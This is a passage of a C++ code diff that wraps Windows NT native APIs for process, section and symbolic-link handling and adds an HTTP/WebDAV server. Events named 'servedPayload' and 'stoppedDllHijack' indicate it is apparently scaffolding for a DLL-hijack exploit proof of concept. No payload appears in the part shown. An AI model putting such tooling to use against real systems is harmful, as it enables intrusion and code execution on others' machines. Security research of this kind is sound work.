ProcessPowerThrottlingState = 77, ProcessReserved3Information = 78, ProcessWin32kSyscallFilterInformation = 79, ProcessDisableSystemAllowedCpuSets = 80, ProcessWakeInformation = 81, ProcessEnergyTrackingState = 82, ProcessManageWritesToExecutableMemory = 83, ProcessCaptureTrustletLiveDump = 84, ProcessTelemetryCoverage = 85, ProcessEnclaveInformation = 86, ProcessEnableReadWriteVmLogging = 87, ProcessUptimeInformation = 88, ProcessImageSection = 89, ProcessDebugAuthInformation = 90, ProcessSystemResourceManagement = 91, ProcessSequenceNumber = 92, ProcessReserved4Information = 93, ProcessSecurityDomainInformation = 94, ProcessCombineSecurityDomainsInformation = 95, ProcessEnableLogging = 96, ProcessLeapSecondInformation = 97, ProcessFiberShadowStackAllocation = 98, ProcessFreeFiberShadowStackAllocation = 99, ProcessAltSystemCallInformation = 100, ProcessDynamicEHContinuationTargets = 101, ProcessDynamicEnforcedCetCompatibleRanges = 102, ProcessCreateStateChange = 103, ProcessApplyStateChange = 104, ProcessEnableOptionalXStateFeatures = 105, MaxProcessInfoClass = 106 };
+
+      IMPORTAPI(L"NTDLL.DLL", NtSetInformationProcess, NTSTATUS, HANDLE, PROCESSINFOCLASS, PVOID, ULONG)
+
+      static constexpr HANDLE NtCurrentProcess() { return ((HANDLE)-1); }
+      static constexpr HANDLE NtCurrentThread() { return ((HANDLE)-2); }
+ 
+      static constexpr unsigned int PS_REQUEST_BREAKAWAY                =   1;
+      static constexpr unsigned int PS_NO_DEBUG_INHERIT                 =   2;
+      static constexpr unsigned int PS_INHERIT_HANDLES                  =   4;
+      static constexpr unsigned int PS_LARGE_PAGES                      =   8;
+      static constexpr unsigned int PS_ALL_FLAGS   = PS_REQUEST_BREAKAWAY |  PS_NO_DEBUG_INHERIT | PS_INHERIT_HANDLES | PS_LARGE_PAGES;
+
+      static constexpr unsigned int PS_ATTRIBUTE_NUMBER_MASK = 0x0000ffff;
+      static constexpr unsigned int PS_ATTRIBUTE_THREAD = 0x00010000; // can be used with threads
+      static constexpr unsigned int PS_ATTRIBUTE_INPUT = 0x00020000; // input only
+      static constexpr unsigned int PS_ATTRIBUTE_ADDITIVE = 0x00040000; /// Is an additional option (see ProcThreadAttributeValue in WinBase.h)
+
+      enum _PS_ATTRIBUTE_NUM { PsAttributeParentProcess = 0, PsAttributeDebugObject = 1, PsAttributeToken = 2, PsAttributeClientId = 3, PsAttributeTebAddress = 4, PsAttributeImageName = 5, PsAttributeImageInfo = 6, PsAttributeMemoryReserve = 7, PsAttributePriorityClass = 8, PsAttributeErrorMode = 9, PsAttributeStdHandleInfo = 10, PsAttributeHandleList = 11, PsAttributeGroupAffinity = 12, PsAttributePreferredNode = 13, PsAttributeIdealProcessor = 14, PsAttributeUmsThread = 15, PsAttributeMitigationOptions = 16, PsAttributeProtectionLevel = 17, PsAttributeSecureProcess = 18, PsAttributeJobList = 19, PsAttributeChildProcessPolicy = 20, PsAttributeAllApplicationPackagesPolicy = 21, PsAttributeWin32kFilter = 22, PsAttributeSafeOpenPromptOriginClaim = 23, PsAttributeBnoIsolation = 24, PsAttributeDesktopAppPolicy = 25, PsAttributeChpe = 26, PsAttributeMitigationAuditOptions = 27, PsAttributeMachineType = 28, PsAttributeComponentFilter = 29, PsAttributeEnableOptionalXStateFeatures = 30, PsAttributeMax = 31 };
+
+      struct  PS_MEMORY_RESERVE {
+         PVOID ReserveAddress;
+         SIZE_T ReserveSize;
+      }  ;
+
+      enum  PS_STD_HANDLE_STATE {
+        PsNeverDuplicate,
+        PsRequestDuplicate, // duplicate standard handles specified by PseudoHandleMask, and only if StdHandleSubsystemType matches the image subsystem
+        PsAlwaysDuplicate, // always duplicate standard handles
+        PsMaxStdHandleStates
+      }  ;
+ 
+      static constexpr unsigned int PS_STD_INPUT_HANDLE = 0x1;
+      static constexpr unsigned int PS_STD_OUTPUT_HANDLE = 0x2;
+      static constexpr unsigned int PS_STD_ERROR_HANDLE = 0x4;
+      
+      struct PS_STD_HANDLE_INFO {
+         union {
+            ULONG Flags;
+            struct {
+               ULONG StdHandleState : 2; // PS_STD_HANDLE_STATE
+               ULONG PseudoHandleMask : 3; // PS_STD_*
+            };
+         };
+         ULONG StdHandleSubsystemType;
+      } ; 
+      enum PS_CREATE_STATE {
+         PsCreateInitialState,
+         PsCreateFailOnFileOpen,
+         PsCreateFailOnSectionCreate,
+         PsCreateFailExeFormat,
+         PsCreateFailMachineMismatch,
+         PsCreateFailExeName, // Debugger specified
+         PsCreateSuccess,
+         PsCreateMaximumStates
+      }  ;
+      typedef struct _STRING
+      {
+         USHORT Length;
+         USHORT MaximumLength;
+         _Field_size_bytes_part_opt_(MaximumLength, Length) PCHAR Buffer;
+      } STRING, * PSTRING, ANSI_STRING, * PANSI_STRING, OEM_STRING, * POEM_STRING;
+
+      struct  CURDIR
+      {
+         UNICODE_STRING DosPath;
+         HANDLE Handle;
+      };
+      struct RTL_DRIVE_LETTER_CURDIR
+      {
+         WORD Flags;
+         WORD Length;
+         ULONG TimeStamp;
+         STRING DosPath;
+      };
+
+      enum PS_PROTECTED_TYPE {
+         PsProtectedTypeNone,
+         PsProtectedTypeProtectedLight,
+         PsProtectedTypeProtected,
+         PsProtectedTypeMax
+      } ;
+
+      enum PS_PROTECTED_SIGNER {
+         PsProtectedSignerNone,
+         PsProtectedSignerAuthenticode,
+         PsProtectedSignerCodeGen,
+         PsProtectedSignerAntimalware,
+         PsProtectedSignerLsa,
+         PsProtectedSignerWindows,
+         PsProtectedSignerWinTcb,
+         PsProtectedSignerMax
+      };
+
+      struct PS_PROTECTION {
+         union {
+            UCHAR Level;
+            struct {
+               UCHAR Type : 3;
+               UCHAR Audit : 1;
+               UCHAR Signer : 4;
+            };
+         };
+      };
+
+      static constexpr unsigned int PROCESS_CREATE_FLAGS_LARGE_PAGE_SYSTEM_DLL   = 0x00000020;
+      static constexpr unsigned int PROCESS_CREATE_FLAGS_PROTECTED_PROCESS       = 0x00000040;
+      static constexpr unsigned int PROCESS_CREATE_FLAGS_CREATE_SESSION          = 0x00000080;
+      static constexpr unsigned int PROCESS_CREATE_FLAGS_INHERIT_FROM_PARENT     = 0x00000100;
+ 
+      static constexpr unsigned int THREAD_CREATE_FLAGS_CREATE_SUSPENDED         = 0x00000001;
+      static constexpr unsigned int THREAD_CREATE_FLAGS_SKIP_THREAD_ATTACH       = 0x00000002;
+      static constexpr unsigned int THREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER       = 0x00000004;
+      static constexpr unsigned int THREAD_CREATE_FLAGS_HAS_SECURITY_DESCRIPTOR  = 0x00000010;
+      static constexpr unsigned int THREAD_CREATE_FLAGS_ACCESS_CHECK_IN_TARGET   = 0x00000020;
+      static constexpr unsigned int THREAD_CREATE_FLAGS_INITIAL_THREAD           = 0x00000080;
+ 
+      struct INITIAL_TEB
+      {
+         struct
+         {
+            PVOID OldStackBase;
+            PVOID OldStackLimit;
+         } OldInitialTeb;
+         PVOID StackBase;
+         PVOID StackLimit;
+         PVOID StackAllocationBase;
+      } ; 
+
+      struct PS_ATTRIBUTE {
+         ULONGLONG Attribute;				/// PROC_THREAD_ATTRIBUTE_XXX | PROC_THREAD_ATTRIBUTE_XXX modifiers, see ProcThreadAttributeValue macro and Windows Internals 6 (372)
+         SIZE_T Size;						/// Size of Value or *ValuePtr
+         union {
+            ULONG_PTR Value;				/// Reserve 8 bytes for data (such as a Handle or a data pointer)
+            PVOID ValuePtr;					/// data pointer
+         };
+         PSIZE_T ReturnLength;				/// Either 0 or specifies size of data returned to caller via "ValuePtr"
+      };
+      struct PS_ATTRIBUTE_LIST {
+         SIZE_T TotalLength;					/// sizeof(PS_ATTRIBUTE_LIST)
+         PS_ATTRIBUTE Attributes[2];			/// Depends on how many attribute entries should be supplied to NtCreateUserProcess
+      } ;
+      struct PS_CREATE_INFO {
+         ULONG64 Size;
+         enum PS_CREATE_STATE State;
+         struct {
+            ULONG InitFlags;
+            UCHAR WriteOutputOnExit : 1;
+            UCHAR DetectManifest : 1;
+            UCHAR IFEOSkipRedirects : 1;
+            UCHAR IFEODoNotPropagateKeyState : 1;
+            UCHAR SpareBits1 : 4;
+            UCHAR SpareBits2 : 8;
+            USHORT ProhibitedImageCharacteristics : 16;
+            ULONG AdditionalFileAccess;
+         } InitState;
+         struct {
+            PVOID FileHandle;
+         } FailSection;
+         struct {
+            USHORT DllCharacteristics;
+         } ExeFormat;
+         struct {
+            PVOID IFEOKey;
+         } ExeName;
+         struct {
+            ULONG OutputFlags;
+            UCHAR ProtectedProcess : 1;
+            UCHAR AddressSpaceOverride : 1;
+            UCHAR DevOverrideEnabled : 1;
+            UCHAR ManifestDetected : 1;
+            UCHAR ProtectedProcessLight : 1;
+            UCHAR SpareBits1 : 3;
+            UCHAR SpareBits2 : 8;
+            USHORT SpareBits3 : 16;
+            PVOID FileHandle;
+            PVOID SectionHandle;
+            ULONG64 UserProcessParametersNative;
+            ULONG UserProcessParametersWow64;
+            ULONG CurrentParameterFlags;
+            ULONG64 PebAddressNative;
+            ULONG PebAddressWow64;
+            ULONG64 ManifestAddress;
+            ULONG ManifestSize;
+         } SuccessState;
+      }; 
+      struct RTL_USER_PROCESS_PARAMETERS {
+         ULONG MaximumLength;
+         ULONG Length;
+         ULONG Flags;
+         ULONG DebugFlags;
+         PVOID ConsoleHandle;
+         ULONG ConsoleFlags;
+         PVOID StandardInput;
+         PVOID StandardOutput;
+         PVOID StandardError;
+         struct CURDIR CurrentDirectory;
+         struct _UNICODE_STRING DllPath;
+         struct _UNICODE_STRING ImagePathName;
+         struct _UNICODE_STRING CommandLine;
+         PVOID Environment;
+         ULONG StartingX;
+         ULONG StartingY;
+         ULONG CountX;
+         ULONG CountY;
+         ULONG CountCharsX;
+         ULONG CountCharsY;
+         ULONG FillAttribute;
+         ULONG WindowFlags;
+         ULONG ShowWindowFlags;
+         struct _UNICODE_STRING WindowTitle;
+         struct _UNICODE_STRING DesktopInfo;
+         struct _UNICODE_STRING ShellInfo;
+         struct _UNICODE_STRING RuntimeData;
+         struct RTL_DRIVE_LETTER_CURDIR CurrentDirectores[32];
+         ULONG64 EnvironmentSize;
+         ULONG64 EnvironmentVersion;
+         PVOID PackageDependencyData;
+         ULONG ProcessGroupId;
+         ULONG LoaderThreads;
+         struct _UNICODE_STRING RedirectionDllName;
+         struct _UNICODE_STRING HeapPartitionName;
+         PULONG64 DefaultThreadpoolCpuSetMasks;
+         ULONG DefaultThreadpoolCpuSetMaskCount;
+         ULONG DefaultThreadpoolThreadMaximum;
+      };
+      static constexpr unsigned int RTL_USER_PROCESS_PARAMETERS_NORMALIZED            = 0x01       ;
+      static constexpr unsigned int RTL_USER_PROCESS_PARAMETERS_PROFILE_USER          = 0x02       ;
+      static constexpr unsigned int RTL_USER_PROCESS_PARAMETERS_PROFILE_KERNEL        = 0x04       ;
+      static constexpr unsigned int RTL_USER_PROCESS_PARAMETERS_PROFILE_SERVER        = 0x08       ;
+      static constexpr unsigned int RTL_USER_PROCESS_PARAMETERS_UNKNOWN               = 0x10       ;
+      static constexpr unsigned int RTL_USER_PROCESS_PARAMETERS_RESERVE_1MB           = 0x20       ;
+      static constexpr unsigned int RTL_USER_PROCESS_PARAMETERS_RESERVE_16MB          = 0x40       ;
+      static constexpr unsigned int RTL_USER_PROCESS_PARAMETERS_CASE_SENSITIVE        = 0x80       ;
+      static constexpr unsigned int RTL_USER_PROCESS_PARAMETERS_DISABLE_HEAP_CHECKS   = 0x100      ;
+      static constexpr unsigned int RTL_USER_PROCESS_PARAMETERS_PROCESS_OR_1          = 0x200      ;
+      static constexpr unsigned int RTL_USER_PROCESS_PARAMETERS_PROCESS_OR_2          = 0x400      ;
+      static constexpr unsigned int RTL_USER_PROCESS_PARAMETERS_PRIVATE_DLL_PATH      = 0x1000     ;
+      static constexpr unsigned int RTL_USER_PROCESS_PARAMETERS_LOCAL_DLL_PATH        = 0x2000     ;
+      static constexpr unsigned int RTL_USER_PROCESS_PARAMETERS_IMAGE_KEY_MISSING     = 0x4000     ;
+      static constexpr unsigned int RTL_USER_PROCESS_PARAMETERS_NX                    = 0x20000    ;
+      static constexpr unsigned int RTL_USER_PROC_CURDIR_CLOSE                        = 0x00000002 ;
+      static constexpr unsigned int RTL_USER_PROC_CURDIR_INHERIT                      = 0x00000003 ;
+      static constexpr unsigned int RTL_MAX_DRIVE_LETTERS = 32;
+      static constexpr unsigned short RTL_DRIVE_LETTER_VALID = 0x0001;
+      struct _AMD64_M128 { ULONG64 Low; LONG64 High; };
+      struct XMM_SAVE_AREA32 { USHORT ControlWord; USHORT StatusWord; UCHAR TagWord; UCHAR Reserved1; USHORT ErrorOpcode; ULONG ErrorOffset; USHORT ErrorSelector; USHORT Reserved2; ULONG DataOffset; USHORT DataSelector; USHORT Reserved3; ULONG MxCsr; ULONG MxCsr_Mask; struct _AMD64_M128 FloatRegisters[8]; struct _AMD64_M128 XmmRegisters[16]; UCHAR Reserved4[96]; };
+      struct CONTEXT { ULONG64 P1Home; ULONG64 P2Home; ULONG64 P3Home; ULONG64 P4Home; ULONG64 P5Home; ULONG64 P6Home; ULONG ContextFlags; ULONG MxCsr; USHORT SegCs; USHORT SegDs; USHORT SegEs; USHORT SegFs; USHORT SegGs; USHORT SegSs; ULONG EFlags; ULONG64 Dr0; ULONG64 Dr1; ULONG64 Dr2; ULONG64 Dr3; ULONG64 Dr6; ULONG64 Dr7; ULONG64 Rax; ULONG64 Rcx; ULONG64 Rdx; ULONG64 Rbx; ULONG64 Rsp; ULONG64 Rbp; ULONG64 Rsi; ULONG64 Rdi; ULONG64 R8; ULONG64 R9; ULONG64 R10; ULONG64 R11; ULONG64 R12; ULONG64 R13; ULONG64 R14; ULONG64 R15; ULONG64 Rip; struct XMM_SAVE_AREA32 FltSave; struct _M128A Header[2]; struct _M128A Legacy[8]; struct _M128A Xmm0; struct _M128A Xmm1; struct _M128A Xmm2; struct _M128A Xmm3; struct _M128A Xmm4; struct _M128A Xmm5; struct _M128A Xmm6; struct _M128A Xmm7; struct _M128A Xmm8; struct _M128A Xmm9; struct _M128A Xmm10; struct _M128A Xmm11; struct _M128A Xmm12; struct _M128A Xmm13; struct _M128A Xmm14; struct _M128A Xmm15; struct _M128A VectorRegister[26]; ULONG64 VectorControl; ULONG64 DebugControl; ULONG64 LastBranchToRip; ULONG64 LastBranchFromRip; ULONG64 LastExceptionToRip; ULONG64 LastExceptionFromRip; };
+       
+      struct NtCreateProcessEx : public NTObj< NtCreateProcessEx >
+      {
+         using NTObj::NTObj;
+         static auto make( params p, HANDLE ParentProcess , BOOLEAN InheritObjectTable, HANDLE SectionHandle, HANDLE DebugPort, HANDLE ExceptionPort,bool InJob) { 
+            return NTObj< NtCreateProcessEx >::make<"NtCreateProcessEx", HANDLE, BOOLEAN, HANDLE, HANDLE, HANDLE,bool >(p,ParentProcess, InheritObjectTable, SectionHandle, DebugPort, ExceptionPort,InJob);
+         }
+      };
+      struct NtCreateThread : public NTObj< NtCreateThread >
+      {
+         using NTObj::NTObj;
+         static NtCreateThread make(params p, HANDLE ProcessHandle,  CLIENT_ID* ClientId, CONTEXT* ThreadContext ,  INITIAL_TEB* InitialTeb, BOOLEAN CreateSuspended) {
+            return NTObj< NtCreateThread >::make<"NtCreateThread", HANDLE, CLIENT_ID*, CONTEXT*, INITIAL_TEB*, BOOLEAN >(p, ProcessHandle, ClientId, ThreadContext, InitialTeb, CreateSuspended);
+         }
+      };
+      struct NtCreateUserProcess : public NTObj< NtCreateUserProcess > 
+      {
+         const NtCreateThread thread;
+
+         template< typename ...REST >
+         NtCreateUserProcess( HANDLE* ProcessHandle, HANDLE* ThreadHandle, REST ... rest ) : thread{ ThreadHandle }, NTObj { ProcessHandle }  {}
+
+         static auto make(
+            HANDLE* ProcessHandle,
+            HANDLE* ThreadHandle,
+            ACCESS_MASK ProcessDesiredAccess,
+            ACCESS_MASK ThreadDesiredAccess,
+            OBJECT_ATTRIBUTES* ProcessObjectAttributes,
+            OBJECT_ATTRIBUTES* ThreadObjectAttributes,
+            ULONG ProcessFlags,
+            ULONG ThreadFlags,
+            RTL_USER_PROCESS_PARAMETERS* ProcessParameters,
+            PS_CREATE_INFO* CreateInfo,
+            PS_ATTRIBUTE_LIST* AttributeList
+         )
+         {
+            HANDLE aProcessHandle{ 0 };
+            HANDLE aThreadHandle{ 0 };
+
+            return NTObj< NtCreateUserProcess >::make< 
+               "NtCreateUserProcess",
+               HANDLE*,
+               HANDLE*,
+               ACCESS_MASK,
+               ACCESS_MASK,
+               OBJECT_ATTRIBUTES*,
+               OBJECT_ATTRIBUTES*,
+               ULONG,
+               ULONG,
+               RTL_USER_PROCESS_PARAMETERS*,
+               PS_CREATE_INFO*,
+               PS_ATTRIBUTE_LIST*
+            >
+            (
+               ProcessHandle ? ProcessHandle : &aProcessHandle,
+               ThreadHandle ? ThreadHandle : &aThreadHandle,
+               ProcessDesiredAccess = MAXIMUM_ALLOWED,
+               ThreadDesiredAccess = MAXIMUM_ALLOWED,
+               ProcessObjectAttributes = NULL,
+               ThreadObjectAttributes = NULL,
+               ProcessFlags = 0,
+               ThreadFlags = 0,
+               ProcessParameters = {0x00},
+               CreateInfo = { 0x00 },
+               AttributeList = { 0x00 }
+            );
+         }
+      };
+
+   }
+
+   struct NtSection : public NTObj< NtSection >
+   {
+      using NTObj::NTObj;
+      static auto make(params p, LARGE_INTEGER* MaximumSize, ULONG SectionPageProtection, ULONG AllocationAttributes, HANDLE  FileHandle) {
+         return NTObj< NtSection >::make< "NtCreateSection", LARGE_INTEGER*, ULONG , ULONG , HANDLE >( p, MaximumSize, SectionPageProtection, AllocationAttributes, FileHandle );
+      }
+      static auto make( params p ) { return NTObj< NtSection >::make<"NtOpenSection">( p ); }
+
+   };
+   struct ntEvent : public NTObj< ntEvent >
+   {
+      using NTObj::NTObj;
+      static auto make( params p, EVENT_TYPE h, BOOLEAN u ) { return NTObj< ntEvent >::make< "NtCreateEvent", EVENT_TYPE, BOOLEAN >(p, h, u); }
+   };
+
+   static constexpr NTSTATUS STATUS_BUFFER_TOO_SMALL = 0xC0000023;
+   static constexpr NTSTATUS STATUS_MORE_ENTRIES = 0x00000105;
+
+   struct NtDirectoryObject : public  NTObj< NtDirectoryObject >
+   {
+      using NTObj::NTObj;
+      static auto make(params p) { return NTObj< NtDirectoryObject >::make< "NtOpenDirectoryObject" >(p); }
+      static auto make(params p, HANDLE h, ULONG u) { return NTObj< NtDirectoryObject >::make< "NtCreateDirectoryObjectEx", HANDLE, ULONG >(p, h, u); }
+      
+      struct OBJECT_DIRECTORY_INFORMATION { UNICODE_STRING Name; UNICODE_STRING TypeName; };
+      IMPORTAPI(L"NTDLL.DLL", NtQueryDirectoryObject, NTSTATUS, HANDLE DirectoryHandle, PVOID Buffer, ULONG Length, BOOLEAN ReturnSingleEntry, BOOLEAN RestartScan, PULONG Context, PULONG ReturnLength)
+
+      vector< pair< wstring, wstring > > getChildren()
+      {
+         ULONG index = 0, bytes;
+         BOOLEAN firstEntry = TRUE;
+         int start = 0;
+
+         vector< pair< wstring, wstring > > list{};
+         auto bufsize = 0xFF00;
+         vector<unsigned char> buf;
+         buf.resize(bufsize);
+         NTSTATUS status;
+
+         do {
+            OBJECT_DIRECTORY_INFORMATION* _buffer = (OBJECT_DIRECTORY_INFORMATION*)&buf[0];
+            bool bigenough = false;
+            while (!bigenough)
+            {
+               status = NtQueryDirectoryObject( getHandle(), _buffer, bufsize, FALSE, firstEntry, &index, &bytes);
+               bigenough = ( status != STATUS_BUFFER_TOO_SMALL );
+               if (!bigenough)
+               {
+                  bufsize = bufsize * 2;
+                  buf.resize(bufsize);
+                  _buffer = (OBJECT_DIRECTORY_INFORMATION*)&buf[0];
+               }
+            }
+            for (ULONG i = index - start - 1; i > 0; --i)
+            {
+               std::wstring name{ _buffer[i].Name.Buffer, ( ( static_cast<unsigned int>( _buffer[i].Name.Length) ) / 2 ) };
+               std::wstring type{ _buffer[i].TypeName.Buffer , ( ( static_cast<unsigned int>( _buffer->TypeName.Length) ) / 2 ) };
+               list.push_back( std::make_pair( name, type ) );
+            }
+            start = index;
+            firstEntry = FALSE;
+         } while ( status == STATUS_MORE_ENTRIES );
+         std::sort( list.begin(), list.end() );
+         return list;
+      }
+   };
+   struct defaults { params p{ 0x00 }; wstr target; };
+
+   struct NtSymbolicLinkObject : public NTObj< NtSymbolicLinkObject >
+   {
+      using NTObj::NTObj;
+      static auto make( defaults p ) { 
+         return ( p.target != L"") ?
+            NTObj< NtSymbolicLinkObject >::make< "NtCreateSymbolicLinkObject", UNICODE_STRING* >( p.p, p.target )  : 
+            NTObj< NtSymbolicLinkObject >::make< "NtOpenSymbolicLinkObject" >( p.p );
+      }
+   //  static auto make( params p ) { return NTObj< NtSymbolicLinkObject >::make< "NtOpenSymbolicLinkObject" >(p); }
+    //  static auto make( params p, UNICODE_STRING* target ) { return NTObj< NtSymbolicLinkObject >::make<"NtCreateSymbolicLinkObject", UNICODE_STRING* >( p, target ); }
+      IMPORTAPI(L"NTDLL.DLL", NtQuerySymbolicLinkObject, NTSTATUS, HANDLE LinkHandle, UNICODE_STRING* LinkTarget, ULONG* ReturnedLength)
+      wstr queryLinkTarget() {
+         UNICODE_STRING buf{ 0x00 };
+         wchar_t bufbuf[255]{ 0x00 };
+         buf.Buffer = &bufbuf[0];
+         buf.MaximumLength = 200;
+         ULONG bufLen = 0;
+
+         NtQuerySymbolicLinkObject( getHandle(), &buf, &bufLen );
+
+
+       
+         NtQuerySymbolicLinkObject(getHandle(), &buf, nullptr );
+         return buf;
+      }
+
+      NtSymbolicLinkObject(defaults p) : NtSymbolicLinkObject{ NtSymbolicLinkObject::make( p ) } { }
+   //   template<typename ...Ts> NtSymbolicLinkObject( params p, Ts... ts ) : NtSymbolicLinkObject{ NtSymbolicLinkObject::make( p, forward<Ts>(ts)... ) } { }
+
+   };
+ 
+ //  IMPORTAPI(L"ntdll.dll", NtRenameKey, NTSTATUS, HANDLE, PUNICODE_STRING);
+ // IMPORTAPI(L"ntdll.dll", NtLoadKeyEx, NTSTATUS, OBJECT_ATTRIBUTES*, OBJECT_ATTRIBUTES*, ULONG, HANDLE, HANDLE, ACCESS_MASK, HANDLE*, IO_STATUS_BLOCK*);
+
+}
+using namespace NT;
+
+namespace httpd
+{
+#include <http.h>
+#pragma comment(lib, "httpapi.lib")
+
+   static constexpr unsigned int REQUEST_SIZE = (sizeof(HTTP_REQUEST) + 2048);
+
+   auto ready = ntEvent::make({ .ObjectName = wstr{ L"\\BaseNamedObjects\\httpdready" } }, ntEvent::EVENT_TYPE::NotificationEvent, false);
+   auto servedPayload = ntEvent::make({ .ObjectName = wstr{ L"\\BaseNamedObjects\\servedPayload" } }, ntEvent::EVENT_TYPE::NotificationEvent, false);
+   auto stoppedDllHijack = ntEvent::make({ .ObjectName = wstr{ L"\\BaseNamedObjects\\stoppedDllHijack" } }, ntEvent::EVENT_TYPE::NotificationEvent, false);
+
+   unordered_map< unsigned int, string> http_status{ {100, "Continue"}, {101, "Switching_Protocol"}, {102, "Processing"}, {103, "Early_Hints"}, {200, "OK"}, {201, "Created"}, {202, "Accepted"}, {203, "Non_Authoritative_Information"}, {204, "No_Content"}, {205, "Reset_Content"}, {206, "Partial_Content"}, {207, "Multi_Status"}, {208, "Already_Reported"}, {226, "IM_Used"}, {300, "Multiple_Choices"}, {301, "Moved_Permanently"}, {302, "Found"}, {303, "See_Other"}, {304, "Not_Modified"}, {305, "Use_Proxy"}, {306, "Switch_Proxy"}, {307, "Temporary_Redirect"}, {308, "Permanent_Redirect"}, {400, "Bad_Request"}, {401, "Unauthorized"}, {402, "Payment_Required"}, {403, "Forbidden"}, {404, "Not_Found"}, {405, "Method_Not_Allowed"}, {406, "Not_Acceptable"}, {407, "Proxy_Authentication_Reqired"}, {408, "Request_Timeout"}, {409, "Conflict"}, {410, "Gone"}, {411, "Length_Required"}, {412, "Precondition_Failed"}, {413, "Payload_Too_Large"}, {414, "URI_Too_Long"}, {415, "Unsupported_Media_Type"}, {416, "Range_Not_Satisfiable"}, {417, "Expectation_Failed"}, {418, "Im_a_teapot"}, {421, "Misdirected_Request"}, {422, "Unprocessable_Entity"}, {423, "Locked"}, {424, "Failed_Dependency"}, {425, "Too_Early"}, {426, "Upgrade_Required"}, {428, "Precondition_Required"}, {429, "Too_Many_Requests"}, {431, "Request_Header_Fields_Too_Large"}, {451, "Unavailable_For_Legal_Reasons"}, {500, "Internal_Server_Error"}, {501, "Not_Implemented"}, {502, "Bad_Gateway"}, {503, "Service_Unavailable"}, {504, "Gateway_Timeout"}, {505, "HTTP_Version_Not_Supported"}, {506, "Variant_Also_Negotiates"}, {507, "Insufficient_Storage"}, {508, "Loop_Detected"}, {510, "Not_Extended"}, {511, "Network_Authentication_Required"} };
+   constexpr static const array< const array< char, 20 >, HttpVerbMaximum + 1 > verbs{ "", "Unknown", "Invalid", "OPTIONS",  "GET", "HEAD", "POST", "PUT","DELETE", "TRACE", "CONNECT", "TRACK",  "MOVE", "COPY", "PROPFIND", "PROPPATCH", "MKCOL", "LOCK","UNLOCK", "SEARCH" };
+
+   class REQUEST {
+   private:
+      unique_ptr< char[] > buf{ new char[REQUEST_SIZE] };
+   public:
+      HTTP_REQUEST_ID requestId;
+      REQUEST() { HTTP_SET_NULL_ID(&requestId); get()->RequestId = requestId; }
+      PHTTP_REQUEST get() { return (PHTTP_REQUEST)(&buf.get()[0]); }
+   };
+
+   class request_response {
+   private:
+      vector< pair< string, string > > headers;
+      array< string, HttpHeaderResponseMaximum > knownheaders;
+   public:
+      const HANDLE h;
+      const HTTP_REQUEST_ID responseTo;
+      const HTTP_VERB requestVerb;
+      const string httphost, url;
+
+      request_response(HANDLE h, HTTP_REQUEST_ID id, HTTP_VERB requestVerb, string httphost, string url) : h{ h }, responseTo{ id }, requestVerb{ requestVerb }, httphost{ httphost }, url{ url } { }
+
+      void setResponseHeader(HTTP_HEADER_ID id, const char* val) { knownheaders[id] = val; }
+      void setResponseHeader(str name, str val) { headers.emplace_back(name, val); }
+
+      auto sendResponse(int statuscode, vector<unsigned char> responsetext)
+      {
+         HTTP_RESPONSE response{ 0x00 };
+         for (int i = 0; i < knownheaders.size(); i++) {
+            response.Headers.KnownHeaders[i].pRawValue = knownheaders[i].c_str();
+            response.Headers.KnownHeaders[i].RawValueLength = static_cast<unsigned short>(knownheaders[i].size());
+         }
+         response.StatusCode = statuscode;
+         response.pReason = http_status.at(statuscode).c_str();
+         response.ReasonLength = static_cast<USHORT>(strlen(response.pReason));
+          
+
+         str contentLengthHeader = to_string( (responsetext.size()));
+         response.Headers.KnownHeaders[HttpHeaderContentLength].pRawValue = contentLengthHeader.c_str();
+         response.Headers.KnownHeaders[HttpHeaderContentLength].RawValueLength = static_cast<unsigned short>(contentLengthHeader.size());
+
+         HTTP_UNKNOWN_HEADER unknowsheaders[10]{ 0x00 };
+         for (int i = 0; i < headers.size(); i++)
+         {
+            unknowsheaders[i] = HTTP_UNKNOWN_HEADER{ static_cast<unsigned short>(headers.at(i).first.size()),
+                                                      static_cast<unsigned short>(headers.at(i).second.size()),
+                                                      headers.at(i).first.c_str(),
+                                                      headers.at(i).second.c_str()
+            };
+         }
+         response.Headers.pUnknownHeaders = unknowsheaders;
+         response.Headers.UnknownHeaderCount = static_cast<unsigned short>(headers.size());
+         THROW_ON_ERR(HttpSendHttpResponse(h, responseTo, (responsetext.size() ? HTTP_SEND_RESPONSE_FLAG_MORE_DATA : 0), &response, NULL, NULL, NULL, 0, NULL, NULL));
+         if (responsetext.size()) {
+           
+            HTTP_DATA_CHUNK dataChunk{ HttpDataChunkFromMemory, (void*)&responsetext.data()[0],  (responsetext.size()    ) };
+            THROW_ON_ERR(HttpSendResponseEntityBody(h, responseTo, 0,1, &dataChunk, NULL, NULL, 0, NULL, NULL));
+         }
+      }
+   };
+   bool httpdActive = true;
+   template< typename HTTPPROCESSOR >
+   struct httpd {
+      const wstr url, port, hostname;
+      HANDLE listeningHandle;
+      auto getListeningProtoHostUrl() { return wstr{ L"http://"s + hostname + ((port != L""s) ? L":"s : L""s) + port + L"/"s + url }; }
+      httpd(wstr hostname, wstr url, wstr port, HTTPPROCESSOR processor) : hostname{ hostname }, url{ url }, port{ port }
+      {
+         THROW_ON_ERR(HttpCreateHttpHandle(&listeningHandle, 0));
+         THROW_ON_ERR(HttpAddUrl(listeningHandle, getListeningProtoHostUrl().c_str(), NULL));
+
+         cout << "Listening on: " << getListeningProtoHostUrl() << " - connect to \\\\" << hostname << "@" << port << "\\" << url << endl;
+         ready.signalPulse();
+         while (httpdActive)
+         {
+            REQUEST pRequest;
+            THROW_ON_ERR(HttpReceiveHttpRequest(listeningHandle, pRequest.get()->RequestId, 0, pRequest.get(), REQUEST_SIZE, NULL, NULL));
+            cout << "Got a " << verbs.at(pRequest.get()->Verb).data() << " request for " << pRequest.get()->CookedUrl.pFullUrl << endl;
+            processor(request_response{ listeningHandle, pRequest.get()->RequestId, pRequest.get()->Verb , ("http://"s + str{hostname} + ":"s + str{ port } + "/"s), str{ pRequest.get()->CookedUrl.pAbsPath }.substr(1) });
+         }
+      }
+      ~httpd() { THROW_ON_ERR(HttpRemoveUrl(listeningHandle, getListeningProtoHostUrl().c_str())); }
+   };
+   template< typename HTTPPROCESSOR > httpd(wstr, wstr, wstr, HTTPPROCESSOR)->httpd< HTTPPROCESSOR >;
+
+   struct httpengine {
+      httpengine() { HttpInitialize(HTTPAPI_VERSION_2, HTTP_INITIALIZE_SERVER, NULL); }
+      ~httpengine() { HttpTerminate(HTTP_INITIALIZE_SERVER, 0); }
+   } engineInstance;
+
+   namespace webdav
+   {
+      class xml {
